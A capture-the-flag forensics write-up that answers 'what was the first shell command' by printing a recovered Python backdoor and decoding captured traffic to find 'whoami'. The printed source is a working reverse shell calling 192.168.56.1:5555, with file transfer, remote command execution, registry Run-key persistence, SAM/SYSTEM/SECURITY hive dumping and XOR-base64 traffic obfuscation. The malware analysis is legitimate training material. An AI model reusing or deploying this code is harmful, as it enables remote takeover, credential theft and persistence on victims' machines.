chal

```
What was the first shell command attacker executed?
```

in the directory `C:\Users\challenge\AppData\Local\Temp\` there is a file `msserver.py`

```
import json
import os
import shutil
import socket
import subprocess
import sys
import time
from sys import platform
import requests
import base64


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, "wb")
    s.settimeout(2)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def upload_file(file_name):
    f = open(file_name, "rb")
    s.send(f.read())
    f.close()


def download_url(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def get_sam_dump():
    if not is_admin():
        return "You must run this function as an Administrator."

    SAM = r"C:\\Windows\\System32\\config\\SAM"
    SYSTEM = r"C:\\Windows\\System32\\config\\SYSTEM"
    SECURITY = r"C:\\Windows\\System32\\config\\SECURITY"

    try:
        sam_file = open(SAM, "rb")
        system_file = open(SYSTEM, "rb")
        security_file = open(SECURITY, "rb")

        sam_data = sam_file.read()
        system_data = system_file.read()
        security_data = security_file.read()

        sam_file.close()
        system_file.close()
        security_file.close()

        return sam_data, system_data, security_data
    except PermissionError:
        return "Insufficient permissions to access SAM, SYSTEM, or SECURITY files."
    except FileNotFoundError:
        return "SAM, SYSTEM, or SECURITY file not found. Please check the file paths."
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"


def persist(reg_name, copy_name):
    file_location = os.environ["appdata"] + "\\" + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "
                + reg_name
                + ' /t REG_SZ /d "'
                + file_location
                + '"',
                shell=True,
            )
            reliable_send("[+] Created Persistence With Reg Key: " + reg_name)
        else:
            reliable_send("[+] Persistence Already Exists")
    except:
        reliable_send("[-] Error Creating Persistence With The Target Machine")


def startup_persist(file_name):
    pass


def is_admin():
    global admin
    if platform == "win32":
        try:
            temp = os.listdir(
                os.sep.join([os.environ.get("SystemRoot", "C:\\windows"), "temp"])
            )
        except:
            admin = "[!!] User Privileges!"
        else:
            admin = "[+] Administrator Privileges!"
    elif platform == "linux" or platform == "linux2" or platform == "darwin":
        pass


def highly_secure_payload(data, flag):
    if flag:
        data = bytearray(data.encode())
        for i in range(len(data)):
            data[i] = data[i] ^ i
        data = base64.b64encode(data).decode()
    else:
        data = bytearray(base64.b64decode(data))
        for i in range(len(data)):
            data[i] = data[i] ^ i
        data = data.decode()
    print(data)
    return data

def shell():
    while True:
        command = reliable_recv()
        command = highly_secure_payload(command, 0)
        if command == "quit":
            break
        elif command == "background" or command == "bg":
            pass
        elif command == "help":
            pass
        elif command == "clear":
            pass
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:6] == "upload":
            download_file(command[7:])
        elif command[:8] == "download":
            upload_file(command[9:])
        elif command[:3] == "get":
            try:
                download_url(command[4:])
                reliable_send("[+] Downloaded File From Specified URL!")
            except:
                reliable_send("[!!] Download Failed!")
        elif command[:11] == "persistence":
            reg_name, copy_name = command[12:].split(" ")
            persist(reg_name, copy_name)
        elif command[:7] == "sendall":
            subprocess.Popen(
                command[8:],
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
        elif command[:5] == "check":
            try:
                is_admin()
                reliable_send(admin + " platform: " + platform)
            except:
                reliable_send("Cannot Perform Privilege Check! Platform: " + platform)
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started!")
            except:
                reliable_send("[-] Failed to start!")

        elif command[:12] == "get_sam_dump":
            sam_dump, system_dump, security_dump = get_sam_dump()
            reliable_send((sam_dump, system_dump, security_dump))
        else:

            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            result = highly_secure_payload(result, 1)
            reliable_send(result)


def connection():
    while True:
        time.sleep(1)
        try:
            s.connect(("192.168.56.1", 5555))
            shell()
            s.close()
            break
        except:
            connection()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
```

there is also a pcap file we see base 64data being transfered

using that we get 


```
d2ltYmls
Y2ljb2hZZW9pZWZuYmprAho=
ZWJqbCRpT2RYQE1MVG54
bEhhU01CQV9rfwcB
ZWJqbCRkUTZ/azlBPERGRXhzf0Fid0Vgf3spVm9UVlEReExhXUcUaURKGWZfZGZhAFJfX0FvT0BfXQhXSV5TaS4CJX55ZXh5aC8jJyljOjck
```


after decrypting this 


```
whoami
chall\challenge

echo lIcPIGGXcv
lIcPIGGXcv
````

therefore flag 

flag{whoami}
